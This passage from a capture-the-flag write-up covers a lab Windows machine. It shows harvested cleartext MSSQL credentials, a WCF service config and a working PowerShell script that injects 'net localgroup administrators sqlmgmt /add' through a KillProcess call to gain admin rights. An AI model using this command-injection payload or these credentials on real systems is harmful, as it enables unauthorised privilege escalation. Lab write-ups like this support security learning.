[MSSQL] Cleartext Hostname : SQL07 ()
[MSSQL] Cleartext Username : sqlmgmt
[MSSQL] Cleartext Password : bIhBbzMMnB82yx
```

we evil-winrm and we get the user.txt 

<img src="assets/Pasted image 20260213174407.png">

# Privelege escalation 

i tried different approachs on enumerating and found different things that didnt actually have a potential for privesc like the dll hijacking path and some other things like another host i pivot to it but nothing .. and i remembered the `overwatch.exe` we decompiled before , the binary is running localy on port 8000 and we have a command injection on `/MonitorService` on the `overwatch.exe.config` 

```xml 
<?xml version="1.0" encoding="utf-8"?> <configuration> <configSections> <!-- For more information on Entity Framework configuration, visit [http://go.microsoft.com/fwlink/?LinkID=237468](http://go.microsoft.com/fwlink/?LinkID=237468) --> <section name="entityFramework" type="System.Data.Entity.Internal.ConfigFile.EntityFrameworkSection, EntityFramework, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" requirePermission="false" /> </configSections> <system.serviceModel> <services> <service name="MonitoringService"> <host> <baseAddresses> <add baseAddress="[http://overwatch.htb:8000/MonitorService](http://overwatch.htb:8000/MonitorService)" /> </baseAddresses> </host> <endpoint address="" binding="basicHttpBinding" contract="IMonitoringService" /> <endpoint address="mex" binding="mexHttpBinding" contract="IMetadataExchange" /> </service> </services> <behaviors> <serviceBehaviors> <behavior> <serviceMetadata httpGetEnabled="True" /> <serviceDebug includeExceptionDetailInFaults="True" /> </behavior> </serviceBehaviors> </behaviors> </system.serviceModel> <entityFramework> <providers> <provider invariantName="System.Data.SqlClient" type="System.Data.Entity.SqlServer.SqlProviderServices, EntityFramework.SqlServer" /> <provider invariantName="System.Data.SQLite.EF6" type="System.Data.SQLite.EF6.SQLiteProviderServices, System.Data.SQLite.EF6" /> </providers> </entityFramework> <system.data> <DbProviderFactories> <remove invariant="System.Data.SQLite.EF6" /> <add name="SQLite Data Provider (Entity Framework 6)" invariant="System.Data.SQLite.EF6" description=".NET Framework Data Provider for SQLite (Entity Framework 6)" type="System.Data.SQLite.EF6.SQLiteProviderFactory, System.Data.SQLite.EF6" /> <remove invariant="System.Data.SQLite" /><add name="SQLite Data Provider" invariant="System.Data.SQLite" description=".NET Framework Data Provider for SQLite" type="System.Data.SQLite.SQLiteFactory, System.Data.SQLite" /></DbProviderFactories> </system.data> </configuration>
```

and we do not have access to the binary path which is on `C:\software\monitoring` so obviously its running by a higher user since we have only `sqlmgmt` and `Administrator` 

so wat we can do is inject commands with a query to that endpoint 
```powershell 
# Add the WCF assembly
Add-Type -AssemblyName System.ServiceModel

# Define the contract interface
$code = @"
using System.ServiceModel;

[ServiceContract]
public interface IMonitoringService
{
    [OperationContract]
    string KillProcess(string processName);
}
"@

Add-Type -TypeDefinition $code -ReferencedAssemblies System.ServiceModel

# Create binding and endpoint
$binding = New-Object System.ServiceModel.BasicHttpBinding
$endpoint = New-Object System.ServiceModel.EndpointAddress("http://localhost:8000/MonitorService")

# Create channel
$factory = New-Object System.ServiceModel.ChannelFactory[IMonitoringService]($binding, $endpoint)
$channel = $factory.CreateChannel()

# Exploit - add yourself to admins 
$result = $channel.KillProcess("calc; net localgroup administrators sqlmgmt /add")
Write-Output $result

# Close
$factory.Close()
```

and if we check we are part of the Admin group 

<img src="assets/Pasted image 20260214193642.png">

and we can type the root.txt file 
